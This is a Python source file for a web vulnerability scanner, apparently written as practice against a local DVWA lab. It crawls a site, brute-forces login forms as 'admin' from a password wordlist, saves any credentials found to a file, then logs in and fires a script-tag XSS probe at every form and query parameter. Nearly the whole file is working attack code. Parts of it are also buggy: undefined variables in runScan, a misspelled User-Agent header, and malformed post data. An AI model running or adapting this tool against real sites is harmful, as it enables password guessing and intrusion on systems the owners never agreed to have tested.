from spider import Spider
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from fake_useragent import UserAgent
#######################################
import argparse, requests, json, re, random

class fc:
    rw = '\033[31;107m'
    r = '\033[38;5;196m'
    pv = '\033[38;5;206;48;5;57m'
    end = '\033[0m'
    p = '\033[38;5;206m'
    y = '\033[0;33;40m'
    pu = '\033[0;35m'
    wg = '\033[37;42m'
    cy = '\033[36m'
    g = '\033[38;5;154m'
    b = '\033[38;5;45m'

class Args:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-u','--url',dest = 'url', help = 'Enter target URL.')
        options = parser.parse_args()
        self.url = options.url

class Vulnscan:
	def __init__(self,url): 
		self.spider = Spider(url,['http://192.168.86.115/dvwa/logout.php'])
		self.url = url
		self.formLinks = []
		self.ua = UserAgent()
		
	def runSpider(self): # run spider will test the site and return list of what it can access
		self.spider.run()
		if len(self.spider.storeLinks) > 0:
			# for link in self.spider.storeLinks:
			# 	print(f'{fc.b}{link}{fc.end})
			with open('links.txt','w') as writeFile:
				for link in self.spider.storeLinks:
					writeFile.write(link)
					writeFile.write('\n')
			return self.spider.storeLinks
		else:
			print('List is empty, check link and try again')

	def testCreds(self,lst):
		print(f'{fc.y}Starting password search...{fc.end}')
		for link in lst:
			response = self.spider.reqGet(link)
			if b'action=' in response and b'login.php' in response:
				forms = self.getForms(link)
				if len(forms) == 1:
					action = forms[0].get('action')
					if 'login' in action:
						form = forms[0]
						action = form.get('action')
						fullurl = (urljoin(link, action))
						inputList = form.findAll('input')
						print(
							f'\n{fc.p}Link: {link}{fc.end}\n'
							f'{fc.p}Action: {action}{fc.end}'
							)
						postData = {}
						for i in inputList:
							#print(i.get('name')) # pass in the name of each input into dict of data
							#print(i.get('type'))
							#print(i.get('value'))
							if i.get('value') == None:
								postData[i.get('name')] = ''
							else:
								postData[i.get('name')] = i.get('type')
						creds = self.returnCreds(fullurl,postData,'admin')
						if creds:
							print(f'{fc.pv}[+]{fc.end} {fc.g}Credentials found for {fc.y}{fullurl}{fc.end}\nWriting to {fc.b}\'creds.txt\'{fc.end}')
							with open('creds.txt','w') as writeCred:
								writeCred.write(fullurl)
								writeCred.write('\n')
								writeCred.write(json.dumps(creds))
								writeCred.write('\n')
							#return[fullurl,creds] # write to a file instead of returning, could exit loop early 
		
	def login(self,url=None,data=None):
		try:
			with open('creds.txt','r') as creds:
				for line in creds:
					if 'http' in line:
						url = line.strip()
					if '{' in line:
						#print(type(line))
						data = json.loads(line)
						#print(type(data))
		except FileNotFoundError:
			print(f'{fc.r}Creds file not found, run testCreds on target{fc.end}')
		print('\n')
		print(f'{fc.pu}={fc.end}'*50)
		print(f'Login session: {fc.wg}{self.spider.session}{fc.end}')
		print(
		f'{fc.y}Logging in{fc.end}\n'
		f'{fc.b}URL:{fc.end} {fc.g}{url}{fc.end}\n'
		f'{fc.b}data:{fc.end} {fc.g}{data}{fc.end}'
		)
		login = self.spider.session.post(url,data=data)
		if login.status_code == 200:
			print(f'{fc.g}{login.status_code} OK{fc.end}\nLogged in to {fc.cy}{url}{fc.end}')
			print(f'{fc.pu}={fc.end}'*50,'\n')
		else:
			print(f'{fc.r}URL or connection error{fc.end}')
	
	def returnCreds(self,url,data,user):
		if list(data.keys())[0] == 'username':
			data['username'] = user
		with open('/opt/wordlists/passwords.txt','r') as rf:
			for password in rf:
				password = password.strip()
				data['password'] = password
				resp = requests.post(url,data = data,timeout=5) #http://192.168.86.115/dvwa/login.php, passing in data dictionary to post request
				if b'Login failed' not in resp.content and b'Authentication Error' not in resp.content:#<div class="message">Login failed</div>, if password is successful:
					#print(f'URL: {url}\nStatus code: {resp.status_code}\nCredentials: {data}\n')
					return data
			print(f'{fc.r}Password not found for {url}{fc.end}')
	
	def listLinks(self,lst):
		for link in lst:
			print(f'{fc.b}{link}{fc.end}')

	def testXSS(self,url,forms=None): #forms can be list
		testScript = '<sCript>alert("test")</scriPt>'
		if forms: # makes sure that list is not empty
			response = self.postForm(forms,testScript,url) # postForm can take a list and parse the bs4 object	
			if response:
				#print(response.text)
				if response.status_code == 200:
					print(f'Status code: {fc.g}{response.status_code} OK{fc.end}')
				if testScript in str(response.content): # first check to make sure testscript is in the string of html
					bsFormPage = BeautifulSoup(response.content,'html.parser')
					postedForm = bsFormPage.findAll('form')
					if postedForm: # second check to make sure page still has a form in the page
						if testScript in str(bsFormPage) or testScript.lower() in str(bsFormPage): # third check to make sure the webpage contains the test script
							print(f'{fc.pv}URL{fc.end} {fc.rw}{url}{fc.end} {fc.pv}is vulnerable to XSS!{fc.end}')
							return True
				else:
					print(f'{fc.r}URL >>{fc.end} {fc.cy}{url}{fc.end} {fc.r}is not vulnerable to XSS.{fc.end}\n')
					return False
		else: # this will run when no form is passed into function, create link with link/?input=input
			if not url.endswith('/'):
				url = url + '/'
			forms = self.getForms(url)
			if forms:
				if len(forms) == 1:
					form = forms[0]
					inputList = form.findAll('input')
					for i in inputList:
						inputName = i.get('name')
						inputType = i.get('type')
						inputValue = i.get('value')
						inputMethod = i.get('method')
						if inputName and inputType == 'text': # should not get the input for the submit button == None
							testUrl = url + f'?{inputName}={testScript}'
							print(f'Sending URL: {fc.g}{testUrl}{fc.end}')
							response = self.spider.session.get(testUrl)
							if response.status_code == 200:
								print(f'Status code: {fc.g}{response.status_code} OK{fc.end}')
							if testScript in str(response.content):
								bslinkPage = BeautifulSoup(response.content,'html.parser')
								bslinkForms = bslinkPage.findAll('form')
								if bslinkForms:
										print(f'{fc.pv}URL{fc.end} {fc.rw}{url}{fc.end} {fc.pv}is vulnerable to XSS!{fc.end}')
										return True
							else: 
								print(f'{fc.rw}No forms in{fc.end} {fc.cy}{testUrl}{fc.end}\n{fc.rw}May only be vulnerable to Post exploit{fc.end}') # if testScripts were found in webpage but if no forms are found after sending links then page likely errored out
								return False
					else:
						print(f'{fc.r}URL >>{fc.end} {fc.cy}{url}{fc.end} {fc.r}is not vulnerable to XSS.{fc.end}')
						return False
			else:
				print(f'{fc.r}URL >>{fc.end} {fc.cy}{url}{fc.end} {fc.r}is not vulnerable to XSS.{fc.end}')
				return False

	def postForm(self,forms,value,url): # can pass a list in for forms but should only be 1 item
		for form in forms:
			inputList = form.findAll('input')
			postData = {}
			action = form.get('action')
			fullurl = (urljoin(url, action))
			method = form.get('method')
			print(
			f'\n{fc.p}Link:{fc.end} {fc.b}{fullurl}{fc.end}\n'
			f'{fc.p}Action:{fc.end} {fc.b}{action}{fc.end}\n'
			f'{fc.p}Method:{fc.end} {fc.b}{method}{fc.end}\n'
			f'{fc.p}Inputs:{fc.end} {fc.b}{inputList}{fc.end}\n'
			f'{fc.p}Form:{fc.end}\n{fc.b}{form}{fc.end}\n'
			)
			if inputList:
				for i in inputList:
					inputName = i.get('name')
					inputType = i.get('type')
					inputValue = i.get('value')
					if inputType == 'text':
						inputValue = value
					postData[inputName] = inputValue
				if method == 'post':
					print(f'{fc.y}Sending Post: {postData}{fc.end}')
					return self.spider.session.post(fullurl,data=postData)
				print(f'{fc.y}Sending Get: {postData}{fc.y}')
				return self.spider.session.get(fullurl,params=postData)
			else:
				print(f'{fc.r}No inputs found on {fullurl}{fc.end}')
				return None
	
	def runScan(self,lst=None): # takes an optional list from another instance just like the login, otherwise opens a file and reads links
		if lst:	
			print(f'{fc.y}Performing scan on{fc.end} {fc.pu}{len(lst)}{fc.end} {fc.y}links...{fc.end}')
			for link in lst:
				forms = self.getForms(link)
				if forms:
					print(f'{fc.y}#{fc.end}'*100)
					print(f'\n{fc.wg}[+]{fc.end} Discovering vulnerability for {fc.cy}{link}{fc.end}')
					is_vulnerable = self.testXSS(link,forms)
					if is_vulnerable:
						#print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{link}{fc.end}\nForm:\n\n{fc.pu}{forms}{fc.end}\n\n')
						print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{link}{fc.end}')
						print(f'{fc.p}Performing URL crosscheck{fc.end}')
						if self.testXSS(link):
							print('\n\n')
							print(f'{fc.pv}{link} is vulnerable to post exploit and link exploit{fc.end}')

				elif '=' in link:
					print(f'{fc.pv}[+]{fc.end} Testing {fc.cy}{link}{fc.end}')
					is_vulnerable = self.testXSS(link)
					if is_vulnerable: 
						print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{url}{fc.end}\nForm:\n\n{fc.pu}{form}{fc.end}\n\n')
				else:
					print(f'{fc.pu}-{fc.end}'*50)
					print(f'{fc.r}No forms in {link}{fc.end}')
		else:
			try:
				with open('links.txt') as readLinks:
					for link in readLinks:
						link = link.strip()
						forms = self.getForms(link)
						if forms:
							print(f'{fc.pu}-{fc.end}'*50)
							print(f'\n{fc.pv}[+]{fc.end} Discovering vulnerability for {fc.cy}{link}{fc.end}')
							is_vulnerable = self.testXSS(link,forms)
							if is_vulnerable:
								print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{link}{fc.end}\nForm:\n\n{fc.pu}{forms}{fc.end}\n\n')
						elif '=' in link:
							print(f'{fc.pv}[+]{fc.end} Testing {fc.cy}{link}{fc.end}')
							is_vulnerable = self.testXSS(link)
							if is_vulnerable: 
								print(f'{fc.pv}[+]{fc.end} {fc.g}XSS found at{fc.end} {fc.cy}{url}{fc.end}\nForm:\n\n{fc.pu}{form}{fc.end}\n\n')
						else:
							print(f'{fc.pu}-{fc.end}'*50)
							print(f'{fc.r}No forms in {link}{fc.end}')

			except FileNotFoundError:
				print(f'{fc.r}No links file! Try passing in list to check for vulnerability{fc.end}')
		
	def getForms(self,url):
		response = self.spider.session.get(url,headers = {'User=Agent': self.ua.random})
		if b'</form>' in response.content: # simple check to see if there is a form tag
			soup = BeautifulSoup(response.content,'html.parser')
			forms = soup.findAll('form') # returns list of forms found by bs 
			return forms
		else:
			return None
		
	def checkForms(self,lst): #pass in a list to check each link for forms
		for link in lst:
			#print(f'{fc.g}{link}{fc.end}')
			forms = self.getForms(link)
			if forms and link not in self.formLinks:
				self.formLinks.append(link)
				#print(f'{fc.r}{link}{fc.end}\n{fc.b}{forms}{fc.end}')
		return self.formLinks

#########################################################RUN#######################################################

def runALL():
	print(f'{fc.pu}#{fc.end}'*100)
	print(f'{fc.y}Starting Stage 1 -- Initial scan{fc.end}')
	args = Args()
	v1 = Vulnscan(args.url)
	v1.runSpider()
	print(f'{fc.g}Initial crawler returned{fc.end} {fc.cy}{len(v1.spider.storeLinks)}{fc.end} {fc.g}links{fc.end}')
	print(f'{fc.cy}{len(v1.checkForms(v1.spider.storeLinks))}{fc.end} {fc.g}links have forms{fc.end}')
	v1.testCreds(v1.formLinks)
	print(f'{fc.pu}#{fc.end}'*100)
	print(f'{fc.y}Starting Stage 2 -- Session scan{fc.end}')
	v2 = Vulnscan(args.url)
	v2.login()
	v2.runSpider()
	formsList = v2.checkForms(v2.spider.storeLinks)
	print(f'{fc.g}Session crawler returned{fc.end} {fc.cy}{len(v2.spider.storeLinks)}{fc.end} {fc.g}links{fc.end}')
	print(f'{fc.cy}{len(formsList)}{fc.end} {fc.g}links have forms{fc.end}')
	print(f'{fc.y}Sending forms to Stage 3{fc.end}')
	print(f'{fc.pu}#{fc.end}'*100)
	print(f'{fc.y}Starting Stage 3 -- Vulnerability scan{fc.end}')
	v3 = Vulnscan(args.url)
	v3.login()
	v3.runScan(v2.checkForms(v2.spider.storeLinks))

runALL()
# args = Args()
# v4 = Vulnscan(args.url)
# v4.login()
# forms = v4.getForms('http://192.168.86.115/dvwa/vulnerabilities/xss_r/')
# v4.testXSS('http://192.168.86.115/dvwa/vulnerabilities/xss_r/',forms)
# v4.testXSS('http://192.168.86.115/dvwa/vulnerabilities/xss_r/')

